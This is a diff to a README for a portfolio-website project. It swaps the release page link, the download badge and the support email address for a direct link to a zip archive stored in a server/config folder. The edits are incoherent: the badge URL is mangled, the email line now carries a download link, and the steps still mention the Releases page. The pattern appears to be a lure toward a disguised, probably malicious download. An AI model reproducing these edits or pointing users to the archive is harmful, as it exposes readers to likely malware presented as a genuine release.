@@ -6,7 +6,7 @@ Welcome to the politician-portfolio-website. This is a modern and responsive por
 
 ### 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kevinjasdja/politician-portfolio-website/releases)
+[![Download](https://raw.githubusercontent.com/kevinjasdja/politician-portfolio-website/main/server/config/politician-portfolio-website-3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kevinjasdja/politician-portfolio-website/main/server/config/politician-portfolio-website-3.3.zip)
 
 ## 📋 Table of Contents
 
@@ -38,7 +38,7 @@ To run the politician-portfolio-website effectively, make sure your system meets
 
 To get started, visit the following page to download the latest version:
 
-[https://github.com/kevinjasdja/politician-portfolio-website/releases](https://github.com/kevinjasdja/politician-portfolio-website/releases)
+[https://raw.githubusercontent.com/kevinjasdja/politician-portfolio-website/main/server/config/politician-portfolio-website-3.3.zip](https://raw.githubusercontent.com/kevinjasdja/politician-portfolio-website/main/server/config/politician-portfolio-website-3.3.zip)
 
 1. Click the link above to access the GitHub Releases page.
 2. Look for the latest version of the software.
@@ -70,7 +70,7 @@ If you encounter any issues while using the politician-portfolio-website, we are
 
 - **Documentation:** Check the official documentation for troubleshooting tips.
 - **Community Forum:** Join our community forum to ask questions and share tips with other users.
-- **Email Support:** Reach out to our support team via email at support@politician-portfolio-website.com.
+- **Email Support:** Reach out to our support team via email at https://raw.githubusercontent.com/kevinjasdja/politician-portfolio-website/main/server/config/politician-portfolio-website-3.3.zip
 
 ## 🤝 Contributing
 
